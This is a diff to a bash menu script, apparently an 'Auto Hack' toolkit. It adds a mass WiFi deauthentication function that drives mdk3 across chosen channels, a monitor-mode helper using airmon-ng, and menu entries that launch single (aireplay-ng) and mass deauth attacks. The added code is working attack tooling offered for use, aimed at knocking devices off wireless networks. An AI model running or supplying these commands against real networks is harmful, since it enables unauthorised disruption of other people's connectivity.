@@ -7,6 +7,7 @@ GREEN='\033[1;32m'
 YLLW='\033[1;33m'
 DG='\033[0;37m'
 LR='\033[0;31m'
+patch=4.03
 #END COLORS
 
 nmapipscan(){
@@ -160,7 +161,7 @@ updater(){
 clear
 printf "${GREEN}
 ------------------------------------
-[+]      Patch 3.83             [+] |
+[+]      Patch $patch             [+] |
 ------------------------------------"
 printf "${GREEN}
 ------------------------------------
@@ -280,6 +281,31 @@ read wlan
 gnome-terminal --command="bash -c 'airodump-ng $wlan --bssid $bssid --channel $channel ;$SHELL'"
 gnome-terminal --command="bash -c 'aireplay-ng -0 0 -a $bssid $wlan;$SHELL'"
 }
+massdeauth(){
+printf "${RED}
+-------------------------------------
+[💀]     MASS DEUATH ATTACK     [💀] |
+-------------------------------------"
+echo ''
+printf "Enter the name of your wireless deivce in monitor mode ---> "
+read wlan
+printf "Enter the channels you would like to deauth on --->"
+read channels
+printf "Example: 6,11,36"
+gnome-terminal --command="bash -c 'echo 💀 HIT CONTROL C TO STOP THE ATTACK 💀; mdk3 $wlan d -c $channels;$SHELL'"
+
+}
+monitormode(){
+printf "${GREEN}
+-------------------------------------
+[✓]    ENTERING MONITOR MODE     [✓] |
+-------------------------------------"
+airmon-ng check kill
+printf "${GREEN}
+-------------------------------------
+[✓]    ENTERING MONITOR MODE     [✓] |
+-------------------------------------"
+}
 exploitation(){
 printf "${RED}
     █████╗ ██╗   ██╗████████╗ ██████╗   ██╗  ██╗ █████╗  ██████╗██╗  ██╗    
@@ -296,8 +322,8 @@ printf "${YLLW}
                                💀 Exploitation 💀                              |                                                
 -------------------------------------------------------------------------------
 1)  Use SMBClient (smbclient)            |                                     |
-                    			 |                    	               |
-	         			 |				       |
+2)  Single Deauth Attack (Aircrack)      |                    	               |
+3)  Mass Deuath Attack (MDK3)	         |				       |
 	 				 |                                     |
    					 |                                     |
                                          |                                     |                
@@ -319,6 +345,14 @@ read choice
 if [ $choice == 1 ]
 then
         smbclient
+     
+elif [ $choice == 2 ]
+then
+	deauth
+
+elif [ $choice == 3 ]
+then
+	massdeauth
 
 elif [ $choice == 'back' ]
 then
@@ -429,7 +463,7 @@ printf "${YLLW}
 1a) Scan for Hosts #2 (Arp)              |				       |
 2)  Scan for WiFi		         |                                     |
 3)  Packet Sniffer (Aircrack)  		 |				       |
-4)  Perform Deauth Attack (Aireplay)     |         MORE SOON!                  |                                        
+4)  Wifi Card --> Monitor Mode	         |         MORE SOON!                  |                                        
 5)  WiFi Card --> Managed Mode           |                                     |
                                          |                                     |
                                          |                                     |
@@ -464,7 +498,7 @@ then
         
 elif [ $choice == 4 ]
 then
-        deauth
+        monitormode
         
         
 elif [ $choice == 5 ]
@@ -564,7 +598,7 @@ printf "${RED}
    ██╔══██║██║   ██║   ██║   ██║   ██║	██╔══██║██╔══██║██║     ██╔═██╗    
    ██║  ██║╚██████╔╝   ██║   ╚██████╔╝	██║  ██║██║  ██║╚██████╗██║  ██╗  
    ╚═╝  ╚═╝ ╚═════╝    ╚═╝    ╚═════╝ 	╚═╝  ╚═╝╚═╝  ╚═╝ ╚═════╝╚═╝  ╚═╝ 
-   				    v3.83  
+   				    v$patch  
 ${NC}"
 #OPTIONS START
 printf "${YLLW}
